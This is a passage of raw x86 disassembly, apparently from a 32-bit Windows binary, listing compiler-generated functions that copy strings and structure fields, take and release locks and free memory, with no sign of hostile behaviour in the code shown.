   16614:	mov    BYTE PTR [eax+0x4],0x0
   16618:	pop    edi
   16619:	pop    esi
   1661a:	mov    DWORD PTR [eax],ecx
   1661c:	pop    ebx
   1661d:	leave  
   1661e:	ret    0x8
   16621:	int3   
   16622:	int3   
   16623:	int3   
   16624:	int3   
   16625:	int3   
   16626:	mov    edi,edi
   16628:	push   ebp
   16629:	mov    ebp,esp
   1662b:	sub    esp,0x10
   1662e:	push   DWORD PTR [ebp+0x8]
   16631:	lea    ecx,[ebp-0x10]
   16634:	call   0x15dc8
   16639:	push   DWORD PTR [ebp+0xc]
   1663c:	mov    ecx,DWORD PTR [ebp+0x8]
   1663f:	call   0x15df4
   16644:	mov    ecx,DWORD PTR [ebp+0xc]
   16647:	lea    eax,[ebp-0x10]
   1664a:	push   eax
   1664b:	call   0x15df4
   16650:	lea    ecx,[ebp-0x10]
   16653:	call   0x160b0
   16658:	leave  
   16659:	ret    0x8
   1665c:	int3   
   1665d:	int3   
   1665e:	int3   
   1665f:	int3   
   16660:	int3   
   16661:	int3   
   16662:	mov    edi,edi
   16664:	push   ebp
   16665:	mov    ebp,esp
   16667:	push   esi
   16668:	push   edi
   16669:	xor    edi,edi
   1666b:	push   edi
   1666c:	push   edi
   1666d:	push   edi
   1666e:	mov    esi,ecx
   16670:	mov    eax,DWORD PTR [esi+0x10]
   16673:	push   edi
   16674:	push   eax
   16675:	call   DWORD PTR ds:0x1ee28
   1667b:	test   eax,eax
   1667d:	jl     0x16694
   1667f:	lea    eax,[ebp+0x8]
   16682:	push   eax
   16683:	mov    ecx,esi
   16685:	call   0x14c3a
   1668a:	push   edi
   1668b:	push   DWORD PTR [esi+0x10]
   1668e:	call   DWORD PTR ds:0x1ee24
   16694:	pop    edi
   16695:	pop    esi
   16696:	pop    ebp
   16697:	ret    0x4
   1669a:	int3   
   1669b:	int3   
   1669c:	int3   
   1669d:	int3   
   1669e:	int3   
   1669f:	int3   
   166a0:	mov    edi,edi
   166a2:	push   ebp
   166a3:	mov    ebp,esp
   166a5:	sub    esp,0x50
   166a8:	test   BYTE PTR [ebp+0x8],0x20
   166ac:	je     0x1675b
   166b2:	push   ebx
   166b3:	lea    ecx,[ebp-0x50]
   166b6:	call   0x136b6
   166bb:	mov    ecx,DWORD PTR ds:0x7eef0
   166c1:	lea    eax,[ebp-0x50]
   166c4:	push   eax
   166c5:	push   DWORD PTR [ebp+0xc]
   166c8:	call   0x16048
   166cd:	test   al,al
   166cf:	je     0x16757
   166d5:	mov    ecx,DWORD PTR [ebp+0x10]
   166d8:	lea    eax,[ebp-0x48]
   166db:	push   eax
   166dc:	call   0x1299c
   166e1:	mov    eax,DWORD PTR [ebp+0x14]
   166e4:	mov    ecx,DWORD PTR [ebp-0x40]
   166e7:	mov    DWORD PTR [eax],ecx
   166e9:	mov    ecx,DWORD PTR [ebp+0x18]
   166ec:	lea    eax,[ebp-0x3c]
   166ef:	push   eax
   166f0:	call   0x1299c
   166f5:	mov    ecx,DWORD PTR [ebp+0x1c]
   166f8:	lea    eax,[ebp-0x34]
   166fb:	push   eax
   166fc:	call   0x1299c
   16701:	mov    ecx,DWORD PTR [ebp+0x20]
   16704:	lea    eax,[ebp-0x2c]
   16707:	push   eax
   16708:	call   0x1299c
   1670d:	mov    eax,DWORD PTR [ebp+0x28]
   16710:	mov    ecx,DWORD PTR [ebp-0x24]
   16713:	mov    DWORD PTR [eax],ecx
   16715:	mov    ecx,DWORD PTR [ebp+0x24]
   16718:	lea    eax,[ebp-0x8]
   1671b:	push   eax
   1671c:	call   0x1299c
   16721:	mov    eax,DWORD PTR [ebp+0x30]
   16724:	mov    ecx,DWORD PTR [ebp-0x18]
   16727:	mov    DWORD PTR [eax],ecx
   16729:	mov    ecx,DWORD PTR [ebp-0x14]
   1672c:	mov    DWORD PTR [eax+0x4],ecx
   1672f:	mov    eax,DWORD PTR [ebp+0x34]
   16732:	mov    ecx,DWORD PTR [ebp-0x10]
   16735:	mov    DWORD PTR [eax],ecx
   16737:	mov    ecx,DWORD PTR [ebp-0xc]
   1673a:	mov    DWORD PTR [eax+0x4],ecx
   1673d:	mov    eax,DWORD PTR [ebp+0x2c]
   16740:	mov    ecx,DWORD PTR [ebp-0x20]
   16743:	mov    DWORD PTR [eax],ecx
   16745:	mov    bl,0x1
   16747:	lea    ecx,[ebp-0x50]
   1674a:	call   0x11e9e
   1674f:	mov    al,bl
   16751:	pop    ebx
   16752:	jmp    0x167f2
   16757:	xor    bl,bl
   16759:	jmp    0x16747
   1675b:	mov    ecx,DWORD PTR ds:0x7eee8
   16761:	push   esi
   16762:	push   DWORD PTR [ebp+0xc]
   16765:	lea    eax,[ebp+0xc]
   16768:	push   eax
   16769:	call   0x13bee
   1676e:	mov    esi,DWORD PTR [ebp+0xc]
   16771:	mov    eax,ds:0x7eee8
   16776:	cmp    esi,DWORD PTR [eax+0x4]
   16779:	jne    0x1677f
   1677b:	xor    al,al
   1677d:	jmp    0x167f1
   1677f:	mov    ecx,DWORD PTR [ebp+0x10]
   16782:	lea    eax,[esi+0x20]
   16785:	push   eax
   16786:	call   0x1299c
   1678b:	mov    eax,DWORD PTR [esi+0x28]
   1678e:	mov    ecx,DWORD PTR [ebp+0x14]
   16791:	mov    DWORD PTR [ecx],eax
   16793:	mov    ecx,DWORD PTR [ebp+0x18]
   16796:	lea    eax,[esi+0x2c]
   16799:	push   eax
   1679a:	call   0x1299c
   1679f:	mov    ecx,DWORD PTR [ebp+0x1c]
   167a2:	lea    eax,[esi+0x34]
   167a5:	push   eax
   167a6:	call   0x1299c
   167ab:	mov    ecx,DWORD PTR [ebp+0x20]
   167ae:	lea    eax,[esi+0x3c]
   167b1:	push   eax
   167b2:	call   0x1299c
   167b7:	mov    ecx,DWORD PTR [ebp+0x24]
   167ba:	lea    eax,[esi+0x60]
   167bd:	push   eax
   167be:	call   0x1299c
   167c3:	mov    eax,DWORD PTR [esi+0x44]
   167c6:	mov    ecx,DWORD PTR [ebp+0x28]
   167c9:	mov    DWORD PTR [ecx],eax
   167cb:	mov    ecx,DWORD PTR [esi+0x50]
   167ce:	mov    eax,DWORD PTR [ebp+0x30]
   167d1:	mov    DWORD PTR [eax],ecx
   167d3:	mov    ecx,DWORD PTR [esi+0x54]
   167d6:	mov    DWORD PTR [eax+0x4],ecx
   167d9:	mov    ecx,DWORD PTR [esi+0x58]
   167dc:	mov    eax,DWORD PTR [ebp+0x34]
   167df:	mov    DWORD PTR [eax],ecx
   167e1:	mov    ecx,DWORD PTR [esi+0x5c]
   167e4:	mov    DWORD PTR [eax+0x4],ecx
   167e7:	mov    eax,DWORD PTR [esi+0x48]
   167ea:	mov    ecx,DWORD PTR [ebp+0x2c]
   167ed:	mov    DWORD PTR [ecx],eax
   167ef:	mov    al,0x1
   167f1:	pop    esi
   167f2:	leave  
   167f3:	ret    0x30
   167f6:	int3   
   167f7:	int3   
   167f8:	int3   
   167f9:	int3   
   167fa:	int3   
   167fb:	int3   
   167fc:	push   0x54
   167fe:	push   0x7e0a8
   16803:	call   0x1dab8
   16808:	xor    esi,esi
   1680a:	push   esi
   1680b:	push   esi
   1680c:	push   esi
   1680d:	push   esi
   1680e:	push   0x7e560
   16813:	call   DWORD PTR ds:0x1ee28
   16819:	cmp    eax,esi
   1681b:	jl     0x169dc
   16821:	mov    DWORD PTR [ebp-0x4],esi
   16824:	or     edi,0xffffffff
   16827:	push   edi
   16828:	mov    esi,0x1ded0
   1682d:	push   esi
   1682e:	lea    ecx,[ebp-0x54]
   16831:	call   0x1109a
   16836:	push   edi
   16837:	push   esi
   16838:	lea    ecx,[ebp-0x4c]
   1683b:	call   0x1109a
   16840:	push   edi
   16841:	push   esi
   16842:	lea    ecx,[ebp-0x44]
   16845:	call   0x1109a
   1684a:	push   edi
   1684b:	push   esi
   1684c:	lea    ecx,[ebp-0x3c]
   1684f:	call   0x1109a
   16854:	push   edi
   16855:	push   esi
   16856:	lea    ecx,[ebp-0x34]
   16859:	call   0x1109a
   1685e:	lea    eax,[ebp-0x64]
   16861:	push   eax
   16862:	lea    eax,[ebp-0x5c]
   16865:	push   eax
   16866:	lea    eax,[ebp-0x20]
   16869:	push   eax
   1686a:	lea    eax,[ebp-0x1c]
   1686d:	push   eax
   1686e:	lea    eax,[ebp-0x34]
   16871:	push   eax
   16872:	lea    eax,[ebp-0x3c]
   16875:	push   eax
   16876:	lea    eax,[ebp-0x44]
   16879:	push   eax
   1687a:	lea    eax,[ebp-0x54]
   1687d:	push   eax
   1687e:	lea    eax,[ebp-0x24]
   16881:	push   eax
   16882:	lea    eax,[ebp-0x4c]
   16885:	push   eax
   16886:	mov    edi,DWORD PTR [ebp+0x8]
   16889:	push   edi
   1688a:	mov    esi,DWORD PTR [ebp+0xc]
   1688d:	push   DWORD PTR [esi+0x4]
   16890:	call   0x166a0
   16895:	test   al,al
   16897:	jne    0x168a5
   16899:	mov    DWORD PTR [esi+0x8],0x1
   168a0:	jmp    0x1698a
   168a5:	mov    edx,DWORD PTR [edi+0x4]
   168a8:	mov    eax,DWORD PTR [ebp-0x48]
   168ab:	lea    ecx,[eax+edx*1+0x2]
   168af:	mov    eax,DWORD PTR [ebp-0x50]
   168b2:	lea    edi,[eax+ecx*1+0x5]
   168b6:	mov    eax,DWORD PTR [ebp-0x40]
   168b9:	lea    eax,[eax+edi*1+0x1]
   168bd:	mov    DWORD PTR [ebp-0x28],eax
   168c0:	mov    ebx,DWORD PTR [ebp-0x38]
   168c3:	lea    eax,[ebx+eax*1+0x1]
   168c7:	mov    DWORD PTR [ebp-0x2c],eax
   168ca:	mov    ebx,DWORD PTR [ebp-0x30]
   168cd:	lea    eax,[ebx+eax*1+0x1]
   168d1:	cmp    eax,DWORD PTR [esi]
   168d3:	jbe    0x168e3
   168d5:	mov    DWORD PTR [esi],eax
   168d7:	mov    DWORD PTR [esi+0x8],0x2
   168de:	jmp    0x1698a
   168e3:	and    DWORD PTR [esi+0x8],0x0
   168e7:	mov    eax,DWORD PTR [ebp-0x1c]
   168ea:	mov    DWORD PTR [esi+0xc],eax
   168ed:	mov    eax,DWORD PTR [ebp-0x5c]
   168f0:	mov    DWORD PTR [esi+0x18],eax
   168f3:	mov    eax,DWORD PTR [ebp-0x58]
   168f6:	mov    DWORD PTR [esi+0x1c],eax
   168f9:	mov    eax,DWORD PTR [ebp-0x64]
   168fc:	mov    DWORD PTR [esi+0x20],eax
   168ff:	mov    eax,DWORD PTR [ebp-0x60]
   16902:	mov    DWORD PTR [esi+0x24],eax
   16905:	mov    eax,DWORD PTR [ebp-0x20]
   16908:	mov    DWORD PTR [esi+0x10],eax
   1690b:	mov    eax,DWORD PTR [ebp+0x8]
   1690e:	mov    eax,DWORD PTR [eax]
   16910:	mov    DWORD PTR [ebp-0x1c],eax
   16913:	lea    eax,[esi+0x28]
   16916:	mov    ebx,DWORD PTR [ebp-0x1c]
   16919:	mov    bl,BYTE PTR [ebx]
   1691b:	mov    BYTE PTR [ebp+0xb],bl
   1691e:	mov    BYTE PTR [eax],bl
   16920:	inc    DWORD PTR [ebp-0x1c]
   16923:	inc    eax
   16924:	test   bl,bl
   16926:	jne    0x16916
   16928:	mov    ebx,DWORD PTR [ebp-0x4c]
   1692b:	lea    edx,[edx+esi*1+0x29]
   1692f:	mov    al,BYTE PTR [ebx]
   16931:	mov    BYTE PTR [edx],al
   16933:	inc    ebx
   16934:	inc    edx
   16935:	test   al,al
   16937:	jne    0x1692f
   16939:	mov    eax,DWORD PTR [ebp-0x24]
   1693c:	mov    DWORD PTR [ecx+esi*1+0x28],eax
   16940:	mov    edx,DWORD PTR [ebp-0x54]
   16943:	lea    ecx,[ecx+esi*1+0x2c]
   16947:	mov    al,BYTE PTR [edx]
   16949:	mov    BYTE PTR [ecx],al
   1694b:	inc    edx
   1694c:	inc    ecx
   1694d:	test   al,al
   1694f:	jne    0x16947
   16951:	mov    ecx,DWORD PTR [ebp-0x44]
   16954:	lea    edi,[edi+esi*1+0x28]
   16958:	mov    al,BYTE PTR [ecx]
   1695a:	mov    BYTE PTR [edi],al
   1695c:	inc    ecx
   1695d:	inc    edi
   1695e:	test   al,al
   16960:	jne    0x16958
   16962:	mov    edx,DWORD PTR [ebp-0x3c]
   16965:	mov    eax,DWORD PTR [ebp-0x28]
   16968:	lea    eax,[eax+esi*1+0x28]
   1696c:	mov    cl,BYTE PTR [edx]
   1696e:	mov    BYTE PTR [eax],cl
   16970:	inc    edx
   16971:	inc    eax
   16972:	test   cl,cl
   16974:	jne    0x1696c
   16976:	mov    ecx,DWORD PTR [ebp-0x34]
   16979:	mov    eax,DWORD PTR [ebp-0x2c]
   1697c:	lea    esi,[eax+esi*1+0x28]
   16980:	mov    al,BYTE PTR [ecx]
   16982:	mov    BYTE PTR [esi],al
   16984:	inc    ecx
   16985:	inc    esi
   16986:	test   al,al
   16988:	jne    0x16980
   1698a:	push   DWORD PTR [ebp-0x34]
   1698d:	call   0x1d9f8
   16992:	push   DWORD PTR [ebp-0x3c]
   16995:	call   0x1d9f8
   1699a:	push   DWORD PTR [ebp-0x44]
   1699d:	call   0x1d9f8
   169a2:	push   DWORD PTR [ebp-0x4c]
   169a5:	call   0x1d9f8
   169aa:	push   DWORD PTR [ebp-0x54]
   169ad:	call   0x1d9f8
   169b2:	add    esp,0x14
   169b5:	jmp    0x169c8
   169b7:	xor    eax,eax
   169b9:	inc    eax
   169ba:	ret    
   169bb:	mov    esp,DWORD PTR [ebp-0x18]
   169be:	mov    eax,DWORD PTR [ebp+0xc]
   169c1:	mov    DWORD PTR [eax+0x8],0x4
   169c8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   169cf:	push   0x0
   169d1:	push   0x7e560
   169d6:	call   DWORD PTR ds:0x1ee24
   169dc:	call   0x1dafd
   169e1:	ret    0x8
   169e4:	int3   
   169e5:	int3   
   169e6:	int3   
   169e7:	int3   
   169e8:	int3   
   169e9:	int3   
   169ea:	mov    edi,edi
   169ec:	push   ebp
   169ed:	mov    ebp,esp
   169ef:	sub    esp,0x10
   169f2:	mov    eax,DWORD PTR [ebp+0x8]
   169f5:	mov    eax,DWORD PTR [eax]
   169f7:	and    DWORD PTR [ebp-0x4],0x0
   169fb:	mov    DWORD PTR [ebp-0x8],eax
   169fe:	lea    eax,[ebp-0x8]
   16a01:	push   eax
   16a02:	lea    eax,[ebp-0x10]
   16a05:	push   eax
   16a06:	call   0x16102
   16a0b:	mov    eax,DWORD PTR [eax]
   16a0d:	add    eax,0x10
   16a10:	leave  
   16a11:	ret    0x4
   16a14:	int3   
   16a15:	int3   
   16a16:	int3   
   16a17:	int3   
   16a18:	int3   
   16a19:	int3   
   16a1a:	mov    edi,edi
   16a1c:	push   esi
   16a1d:	mov    esi,ecx
   16a1f:	mov    BYTE PTR [esi+0x8],0x0
   16a23:	call   0x140da
   16a28:	mov    eax,esi
   16a2a:	pop    esi
   16a2b:	ret    0x8
   16a2e:	int3   
   16a2f:	int3   
   16a30:	int3   
   16a31:	int3   
   16a32:	int3   
   16a33:	int3   
   16a34:	mov    edi,edi
   16a36:	push   ebp
   16a37:	mov    ebp,esp
   16a39:	push   ecx
   16a3a:	push   ecx
   16a3b:	push   DWORD PTR [ebp+0xc]
   16a3e:	lea    eax,[ebp-0x8]
   16a41:	push   eax
   16a42:	call   0x161ac
   16a47:	mov    eax,DWORD PTR [ebp+0x8]
   16a4a:	mov    ecx,DWORD PTR [ebp-0x8]
   16a4d:	mov    DWORD PTR [eax],ecx
   16a4f:	mov    cl,BYTE PTR [ebp-0x4]
   16a52:	mov    BYTE PTR [eax+0x4],cl
   16a55:	leave  
   16a56:	ret    0x8
   16a59:	int3   
   16a5a:	int3   
   16a5b:	int3   
   16a5c:	int3   
   16a5d:	int3   
   16a5e:	mov    edi,edi
   16a60:	push   ebp
   16a61:	mov    ebp,esp
   16a63:	push   ecx
   16a64:	push   esi
   16a65:	mov    esi,ecx
   16a67:	mov    eax,DWORD PTR [esi+0x4]
   16a6a:	mov    ecx,DWORD PTR [eax]
   16a6c:	push   eax
   16a6d:	push   ecx
   16a6e:	lea    eax,[ebp-0x4]
   16a71:	push   eax
   16a72:	mov    ecx,esi
   16a74:	call   0x16246
   16a79:	push   DWORD PTR [esi+0x4]
   16a7c:	call   0x1d9f8
   16a81:	xor    eax,eax
   16a83:	mov    DWORD PTR [esi+0x4],eax
   16a86:	mov    DWORD PTR [esi+0xc],eax
   16a89:	dec    DWORD PTR ds:0x7fa24
   16a8f:	pop    ecx
   16a90:	pop    esi
   16a91:	jne    0x16aa9
   16a93:	mov    ecx,DWORD PTR ds:0x7f8c0
   16a99:	mov    ds:0x7f8c0,eax
   16a9e:	cmp    ecx,eax
   16aa0:	je     0x16aa9
   16aa2:	push   ecx
   16aa3:	call   0x1d9f8
   16aa8:	pop    ecx
   16aa9:	leave  
   16aaa:	ret    
   16aab:	int3   
   16aac:	int3   
   16aad:	int3   
   16aae:	int3   
   16aaf:	int3   
   16ab0:	mov    edi,edi
   16ab2:	push   ebp
   16ab3:	mov    ebp,esp
   16ab5:	push   ecx
   16ab6:	push   ecx
   16ab7:	push   DWORD PTR [ebp+0xc]
   16aba:	lea    eax,[ebp-0x8]
   16abd:	push   eax
   16abe:	call   0x162c4
   16ac3:	mov    eax,DWORD PTR [ebp+0x8]
   16ac6:	mov    ecx,DWORD PTR [ebp-0x8]
   16ac9:	mov    DWORD PTR [eax],ecx
   16acb:	mov    cl,BYTE PTR [ebp-0x4]
   16ace:	mov    BYTE PTR [eax+0x4],cl
   16ad1:	leave  
   16ad2:	ret    0x8
   16ad5:	int3   
   16ad6:	int3   
   16ad7:	int3   
   16ad8:	int3   
   16ad9:	int3   
   16ada:	mov    edi,edi
   16adc:	push   ebp
   16add:	mov    ebp,esp
   16adf:	push   ecx
   16ae0:	mov    eax,DWORD PTR [ecx+0x4]
   16ae3:	mov    edx,DWORD PTR [eax]
   16ae5:	push   eax
   16ae6:	push   edx
   16ae7:	lea    eax,[ebp-0x4]
   16aea:	push   eax
   16aeb:	call   0x1635e
   16af0:	leave  
   16af1:	ret    
   16af2:	int3   
   16af3:	int3   
   16af4:	int3   
   16af5:	int3   
   16af6:	int3   
   16af7:	int3   
   16af8:	mov    edi,edi
   16afa:	push   ebp
   16afb:	mov    ebp,esp
   16afd:	push   ecx
   16afe:	push   ecx
   16aff:	push   DWORD PTR [ebp+0xc]
   16b02:	lea    eax,[ebp-0x8]
   16b05:	push   eax
   16b06:	call   0x163dc
   16b0b:	mov    eax,DWORD PTR [ebp+0x8]
   16b0e:	mov    ecx,DWORD PTR [ebp-0x8]
   16b11:	mov    DWORD PTR [eax],ecx
   16b13:	mov    cl,BYTE PTR [ebp-0x4]
   16b16:	mov    BYTE PTR [eax+0x4],cl
   16b19:	leave  
   16b1a:	ret    0x8
   16b1d:	int3   
   16b1e:	int3   
   16b1f:	int3   
   16b20:	int3   
   16b21:	int3   
   16b22:	mov    edi,edi
   16b24:	push   ebp
   16b25:	mov    ebp,esp
   16b27:	push   ecx
   16b28:	push   ecx
   16b29:	push   DWORD PTR [ebp+0xc]
   16b2c:	lea    eax,[ebp-0x8]
   16b2f:	push   eax
   16b30:	call   0x16476
   16b35:	mov    eax,DWORD PTR [ebp+0x8]
   16b38:	mov    ecx,DWORD PTR [ebp-0x8]
   16b3b:	mov    DWORD PTR [eax],ecx
   16b3d:	mov    cl,BYTE PTR [ebp-0x4]
   16b40:	mov    BYTE PTR [eax+0x4],cl
   16b43:	leave  
   16b44:	ret    0x8
   16b47:	int3   
   16b48:	int3   
   16b49:	int3   
   16b4a:	int3   
   16b4b:	int3   
   16b4c:	mov    edi,edi
   16b4e:	push   ebp
   16b4f:	mov    ebp,esp
   16b51:	push   ecx
   16b52:	push   ecx
   16b53:	push   esi
   16b54:	push   DWORD PTR [ebp+0x8]
   16b57:	lea    eax,[ebp-0x8]
   16b5a:	push   eax
   16b5b:	mov    esi,ecx
   16b5d:	call   0x1413c
   16b62:	and    DWORD PTR [ebp+0x8],0x0
   16b66:	lea    eax,[ebp+0x8]
   16b69:	push   eax
   16b6a:	push   DWORD PTR [ebp-0x4]
   16b6d:	push   DWORD PTR [ebp-0x8]
   16b70:	call   0x13a32
   16b75:	add    esp,0xc
   16b78:	push   DWORD PTR [ebp-0x4]
   16b7b:	lea    eax,[ebp-0x4]
   16b7e:	push   DWORD PTR [ebp-0x8]
   16b81:	mov    ecx,esi
   16b83:	push   eax
   16b84:	call   0x1650e
   16b89:	mov    eax,DWORD PTR [ebp+0x8]
   16b8c:	pop    esi
   16b8d:	leave  
   16b8e:	ret    0x4
   16b91:	int3   
   16b92:	int3   
   16b93:	int3   
   16b94:	int3   
   16b95:	int3   
   16b96:	mov    edi,edi
   16b98:	push   ebp
   16b99:	mov    ebp,esp
   16b9b:	push   ecx
   16b9c:	mov    eax,DWORD PTR [ecx+0x4]
   16b9f:	mov    edx,DWORD PTR [eax]
   16ba1:	push   eax
   16ba2:	push   edx
   16ba3:	lea    eax,[ebp-0x4]
   16ba6:	push   eax
   16ba7:	call   0x1650e
   16bac:	leave  
   16bad:	ret    
   16bae:	int3   
   16baf:	int3   
   16bb0:	int3   
   16bb1:	int3   
   16bb2:	int3   
   16bb3:	int3   
   16bb4:	mov    edi,edi
   16bb6:	push   ebp
   16bb7:	mov    ebp,esp
   16bb9:	push   ecx
   16bba:	push   ecx
   16bbb:	push   DWORD PTR [ebp+0xc]
   16bbe:	lea    eax,[ebp-0x8]
   16bc1:	push   eax
   16bc2:	call   0x1658c
   16bc7:	mov    eax,DWORD PTR [ebp+0x8]
   16bca:	mov    ecx,DWORD PTR [ebp-0x8]
   16bcd:	mov    DWORD PTR [eax],ecx
   16bcf:	mov    cl,BYTE PTR [ebp-0x4]
   16bd2:	mov    BYTE PTR [eax+0x4],cl
   16bd5:	leave  
   16bd6:	ret    0x8
   16bd9:	int3   
   16bda:	int3   
   16bdb:	int3   
   16bdc:	int3   
   16bdd:	int3   
   16bde:	mov    edi,edi
   16be0:	push   esi
   16be1:	mov    esi,ecx
   16be3:	push   edi
   16be4:	mov    BYTE PTR [esi+0x8],0x0
   16be8:	call   0x13fb2
   16bed:	lea    edi,[esi+0x10]
   16bf0:	mov    ecx,edi
   16bf2:	call   0x129e6
   16bf7:	mov    edi,DWORD PTR [edi]
   16bf9:	push   0x0
   16bfb:	push   edi
   16bfc:	call   0x11c02
   16c01:	call   eax
   16c03:	pop    edi
   16c04:	mov    eax,esi
   16c06:	pop    esi
   16c07:	ret    
   16c08:	int3   
   16c09:	int3   
   16c0a:	int3   
   16c0b:	int3   
   16c0c:	int3   
   16c0d:	int3   
   16c0e:	mov    edi,edi
   16c10:	push   ebp
   16c11:	mov    ebp,esp
   16c13:	push   esi
   16c14:	push   edi
   16c15:	xor    edi,edi
   16c17:	push   edi
   16c18:	push   edi
   16c19:	push   edi
   16c1a:	mov    esi,ecx
   16c1c:	mov    eax,DWORD PTR [esi+0x10]
   16c1f:	push   edi
   16c20:	push   eax
   16c21:	call   DWORD PTR ds:0x1ee28
   16c27:	test   eax,eax
   16c29:	jl     0x16c45
   16c2b:	lea    eax,[ebp+0x8]
   16c2e:	push   eax
   16c2f:	mov    ecx,esi
   16c31:	call   0x169ea
   16c36:	mov    ecx,DWORD PTR [ebp+0xc]
   16c39:	push   edi
   16c3a:	mov    DWORD PTR [eax],ecx
   16c3c:	push   DWORD PTR [esi+0x10]
   16c3f:	call   DWORD PTR ds:0x1ee24
   16c45:	pop    edi
   16c46:	pop    esi
   16c47:	pop    ebp
   16c48:	ret    0x8
   16c4b:	int3   
   16c4c:	int3   
   16c4d:	int3   
   16c4e:	int3   
   16c4f:	int3   
   16c50:	mov    edi,edi
   16c52:	push   ebp
   16c53:	mov    ebp,esp
   16c55:	sub    esp,0x38
   16c58:	push   esi
   16c59:	call   0x1a1a4
   16c5e:	test   al,al
   16c60:	jne    0x16c6a
   16c62:	mov    eax,DWORD PTR [ebp+0x8]
   16c65:	jmp    0x16d3b
   16c6a:	push   DWORD PTR [ebp+0xc]
   16c6d:	lea    ecx,[ebp-0x8]
   16c70:	push   DWORD PTR [ebp+0x8]
   16c73:	call   0x12acc
   16c78:	mov    ecx,DWORD PTR ds:0x7fa50
   16c7e:	lea    eax,[ebp-0x8]
   16c81:	push   eax
   16c82:	lea    eax,[ebp+0xc]
   16c85:	push   eax
   16c86:	call   0x141d0
   16c8b:	mov    esi,DWORD PTR [ebp+0xc]
   16c8e:	mov    eax,ds:0x7fa50
   16c93:	cmp    esi,DWORD PTR [eax+0x4]
   16c96:	jne    0x16cf6
   16c98:	push   ecx
   16c99:	push   ecx
   16c9a:	lea    eax,[ebp-0x8]
   16c9d:	mov    ecx,esp
   16c9f:	push   eax
   16ca0:	call   0x12aec
   16ca5:	lea    eax,[ebp-0x10]
   16ca8:	push   eax
   16ca9:	call   0x12b6a
   16cae:	lea    eax,[ebp-0x10]
   16cb1:	push   eax
   16cb2:	lea    eax,[ebp-0x8]
   16cb5:	push   eax
   16cb6:	lea    ecx,[ebp-0x38]
   16cb9:	call   0x135be
   16cbe:	lea    eax,[ebp-0x38]
   16cc1:	push   eax
   16cc2:	lea    ecx,[ebp-0x28]
   16cc5:	call   0x1342c
   16cca:	mov    ecx,DWORD PTR ds:0x7fa50
   16cd0:	lea    eax,[ebp-0x28]
   16cd3:	push   eax
   16cd4:	lea    eax,[ebp-0x18]
   16cd7:	push   eax
   16cd8:	call   0x16bb4
   16cdd:	lea    ecx,[ebp-0x28]
   16ce0:	call   0x1107c
   16ce5:	lea    ecx,[ebp-0x38]
   16ce8:	call   0x1107c
   16ced:	push   DWORD PTR [ebp-0x10]
   16cf0:	call   0x1d9f8
   16cf5:	pop    ecx
   16cf6:	mov    eax,DWORD PTR [ebp+0x10]
   16cf9:	movzx  eax,BYTE PTR [eax]
   16cfc:	cmp    eax,0x100
   16d01:	jge    0x16d19
   16d03:	mov    ecx,DWORD PTR ds:0x7fa50
   16d09:	lea    eax,[ebp-0x8]
   16d0c:	push   eax
   16d0d:	lea    eax,[ebp+0xc]
   16d10:	push   eax
   16d11:	call   0x141d0
   16d16:	mov    esi,DWORD PTR [ebp+0xc]
   16d19:	mov    eax,ds:0x7fa50
   16d1e:	cmp    esi,DWORD PTR [eax+0x4]
   16d21:	je     0x16d28
   16d23:	mov    esi,DWORD PTR [esi+0x14]
   16d26:	jmp    0x16d2b
   16d28:	mov    esi,DWORD PTR [ebp+0x8]
   16d2b:	call   0x1a1c0
   16d30:	push   DWORD PTR [ebp-0x8]
   16d33:	call   0x1d9f8
   16d38:	pop    ecx
   16d39:	mov    eax,esi
   16d3b:	pop    esi
   16d3c:	leave  
   16d3d:	ret    0xc
   16d40:	int3   
   16d41:	int3   
   16d42:	int3   
   16d43:	int3   
   16d44:	int3   
   16d45:	int3   
   16d46:	mov    edi,edi
   16d48:	push   ebp
   16d49:	mov    ebp,esp
   16d4b:	sub    esp,0x38
   16d4e:	push   esi
   16d4f:	call   0x1a1a4
   16d54:	test   al,al
   16d56:	jne    0x16d60
   16d58:	mov    eax,DWORD PTR [ebp+0x8]
   16d5b:	jmp    0x16e31
   16d60:	push   DWORD PTR [ebp+0xc]
   16d63:	lea    ecx,[ebp-0x8]
   16d66:	push   DWORD PTR [ebp+0x8]
   16d69:	call   0x1295a
   16d6e:	mov    ecx,DWORD PTR ds:0x7fa54
   16d74:	lea    eax,[ebp-0x8]
   16d77:	push   eax
   16d78:	lea    eax,[ebp+0xc]
   16d7b:	push   eax
   16d7c:	call   0x13c36
   16d81:	mov    esi,DWORD PTR [ebp+0xc]
   16d84:	mov    eax,ds:0x7fa54
   16d89:	cmp    esi,DWORD PTR [eax+0x4]
   16d8c:	jne    0x16dec
   16d8e:	push   ecx
   16d8f:	push   ecx
   16d90:	lea    eax,[ebp-0x8]
   16d93:	mov    ecx,esp
   16d95:	push   eax
   16d96:	call   0x1297a
   16d9b:	lea    eax,[ebp-0x10]
   16d9e:	push   eax
   16d9f:	call   0x12bae
   16da4:	lea    eax,[ebp-0x10]
   16da7:	push   eax
   16da8:	lea    eax,[ebp-0x8]
   16dab:	push   eax
   16dac:	lea    ecx,[ebp-0x38]
   16daf:	call   0x135e6
   16db4:	lea    eax,[ebp-0x38]
   16db7:	push   eax
   16db8:	lea    ecx,[ebp-0x28]
   16dbb:	call   0x13458
   16dc0:	mov    ecx,DWORD PTR ds:0x7fa54
   16dc6:	lea    eax,[ebp-0x28]
   16dc9:	push   eax
   16dca:	lea    eax,[ebp-0x18]
   16dcd:	push   eax
   16dce:	call   0x16af8
   16dd3:	lea    ecx,[ebp-0x28]
   16dd6:	call   0x1107c
   16ddb:	lea    ecx,[ebp-0x38]
   16dde:	call   0x1107c
   16de3:	push   DWORD PTR [ebp-0x10]
   16de6:	call   0x1d9f8
   16deb:	pop    ecx
   16dec:	mov    eax,DWORD PTR [ebp+0x10]
   16def:	movzx  eax,BYTE PTR [eax]
   16df2:	cmp    eax,0x100
   16df7:	jge    0x16e0f
   16df9:	mov    ecx,DWORD PTR ds:0x7fa54
   16dff:	lea    eax,[ebp-0x8]
   16e02:	push   eax
   16e03:	lea    eax,[ebp+0xc]
   16e06:	push   eax
   16e07:	call   0x13c36
   16e0c:	mov    esi,DWORD PTR [ebp+0xc]
   16e0f:	mov    eax,ds:0x7fa54
   16e14:	cmp    esi,DWORD PTR [eax+0x4]
   16e17:	je     0x16e1e
   16e19:	mov    esi,DWORD PTR [esi+0x14]
   16e1c:	jmp    0x16e21
   16e1e:	mov    esi,DWORD PTR [ebp+0x8]
   16e21:	call   0x1a1c0
   16e26:	push   DWORD PTR [ebp-0x8]
   16e29:	call   0x1d9f8
   16e2e:	pop    ecx
   16e2f:	mov    eax,esi
